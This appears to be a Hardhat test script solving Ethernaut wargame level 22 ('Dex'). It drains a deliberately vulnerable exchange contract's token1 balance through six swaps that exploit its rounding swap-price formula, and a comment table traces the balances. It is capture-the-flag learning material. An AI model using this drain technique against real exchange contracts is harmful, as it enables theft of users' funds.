// # Ethernaut 22: Dex

import {ethers} from 'hardhat'
import {Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F'
const INSTANCE_ADDRESS = '0xf65D135ca65088ad0dc1ca91033f5295b7C8d76e'

describe('22 Dex', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  let _1: string
  let _2: string
  let token1: Contract
  let token2: Contract

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Dex', INSTANCE_ADDRESS)

    _1 = await instance.token1()
    _2 = await instance.token2()

    token1 = await ethers.getContractAt('SwappableToken', _1)
    token2 = await ethers.getContractAt('SwappableToken', _2)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  // Approve `Dex` instance for transferring our tokens.
  it("approves instance for signer's tokens", async () => {
    const tx = await instance.approve(instance.address, 1000000, {gasLimit: 100000})
    return expectStatusOK(tx)
  })

  // The instance's balance of one token can be nulled by swapping tokens back and forth,
  // making the 'from' token cheaper each time, so we can buy it back at a cheaper rate
  // in the subsequent swap. In the first five swaps, we always exchange our entire balance
  // of the 'from' token. In the last swap, we exchange the exact amount needed to take out
  // the instance's remaining balance of the token we are nulling.
/*
This is the sequence of balances and swaps:
| Dex: Token 1 | Dex: Token 2 | Player: Token 1 | Player: Token 2 | Swap                 |
|--------------|--------------|-----------------|-----------------|----------------------|
| 100          | 100          | 10              | 10              | Get  10 T2 for 10 T1 |
| 110          | 90           | 0               | 20              | Get  24 T1 for 20 T2 |
| 86           | 110          | 24              | 0               | Get  30 T2 for 24 T1 |
| 110          | 80           | 0               | 30              | Get  41 T1 for 30 T2 |
| 69           | 110          | 41              | 0               | Get  65 T2 for 41 T1 |
| 110          | 45           | 0               | 65              | Get 110 T1 for 45 T2 |
| 0            | 90           | 110             | 20              | Nulled.              |

Plugging the Dex balances before the last swap into 'get_swap_price':
    floor( amount * 110 / 45 ) = 110  ==>  amount = 45
*/
  it("nulls instance's balance of token1 in six swaps", async () => {
    const swap = async (_from: number, _to: number, amount: number) => {
      process.stdout.write(`Buy T${_to} for ${amount} of T${_from}... ◉\r`)
      const tokenAddr = [0, _1, _2]
      const tx = await instance.swap(tokenAddr[_from], tokenAddr[_to], amount, {gasLimit: 500000})
      const rcpt = await tx.wait()
      expect(rcpt.status).to.eq(1)
      process.stdout.write(`Buy T${_to} for ${amount} of T${_from}... ✔\n`)
    }
    await swap(1, 2, 10)
    await swap(2, 1, 20)
    await swap(1, 2, 24)
    await swap(2, 1, 30)
    await swap(1, 2, 41)
    await swap(2, 1, 45)
    expect(await token1.balanceOf(instance.address)).to.eq(0)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
